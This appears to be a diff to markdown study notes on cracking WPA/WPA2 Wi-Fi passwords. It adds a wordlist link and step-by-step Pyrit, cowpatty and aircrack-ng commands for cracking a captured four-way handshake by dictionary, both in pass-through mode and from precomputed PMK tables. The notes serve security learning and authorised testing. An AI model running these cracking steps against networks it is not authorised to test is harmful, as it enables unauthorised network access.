@@ -44,7 +44,7 @@ The  key  negotiation  phase  in  WPA2  is  identical  to  the  four-way  handsh
 
 ### Brute Force w/ dictionary
 
-This attack is time consuming using the dictionary attack.  This is beause PBKDF2 generates the PTK and repeats the HMAC SHA-1 hash 4,096 times.  
+This attack is time consuming using the dictionary attack.  This is beause PBKDF2 generates the PTK and repeats the HMAC SHA-1 hash 4,096 times.  Dictionaries [http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists/languages/]
 
 First you must capture packets until you collect the four-way WPA handshake
 
@@ -115,9 +115,82 @@ Cowpatty usage:
 - -v: prints verbose information
 - -V: program version
 
-#### Pyrit
+---
+
+#### **Pyrit**
 
 Pyrit is a WPA-PSK and WPA2-PSK cracker and currently the most efficient tool that can utilize ATI-Stream, NVIDIA CUDA, OpenCL and  VIA Padlock.
+
+Pyrit operates in two modes: pass-through mode ( pyrit calculates PMK in real time and sends to cowpatty ) and batch-processing mode.
+
+##### **Pass-through**
+
+```sh
+pyrit -e <ESSID> -f <DICTIONARY-FILE> passthrough | cowpatty -r <CAPTURED-4WAY-FILE> -s <ESSID> -d -
+# -d means hashes come from standard input
+```
+
+Cowpatty comparison (took 10x longer)
+
+```sh
+cowpatty -r wpa-hackme-01.cap -s hackingschool -f dict.txt
+# -r captured packet
+# -s network ESSID
+# -f dictionary file .txt
+```
+
+##### **Batch-processing**
+
+First step is hash table generation starting with creation of new ESSID
+
+```sh
+# create a new ESSID
+pyrit -e <NEW-ESSID> create_essid
+# example
+pyrit -e HackthisNetwork create_essid
+```
+
+Check that the ESSID was created
+
+```sh
+pyrit list_essids
+```
+
+Next import the wordlist dictionary into the database
+
+```sh
+pyrit -e <NEW-ESSID> -f <DICTIONARY-FILE> import_passwords
+```
+
+Finally you can start batch processing and generate PMKs for the database with CUDA this will be 100x faster than CPU
+
+```sh
+pyrit -e <NEW-ESSID> batch
+```
+
+You can export the computed PMK database for both **cowpatty** and **aircrack-ng** formats.  
+
+```sh
+pyrit -e <NEW-ESSID> -f <DICTIONARY-FILE> export_cowpatty
+```
+
+To begin the crack
+
+```sh
+cowpatty -d <DICTIONARY-HASH-EXPORT> -r <CAPTURED-4WAY-FILE> -s <ESSID>
+```
+
+Or export for aircrack-ng
+
+```sh
+pyrit -e <NEW-ESSID> -f <DICTIONARY-FILE> export_hashdb
+```
+
+and crack
+
+```sh
+aircrack-ng -r <DICTIONARY-HASH-EXPORT> -e <ESSID> <CAPTURED-4WAY-FILE>
+```
 
 ### Aircrack Tools
 
@@ -136,3 +209,4 @@ Pyrit is a WPA-PSK and WPA2-PSK cracker and currently the most efficient tool th
 - easside-ng: communicates to an AP without knowing the WEP key.
 - tkiptun-ng: mounts WPA/TKIP attacks.
 - wesside-ng: an auto-magic tool t hat recovers WEP keys.
+
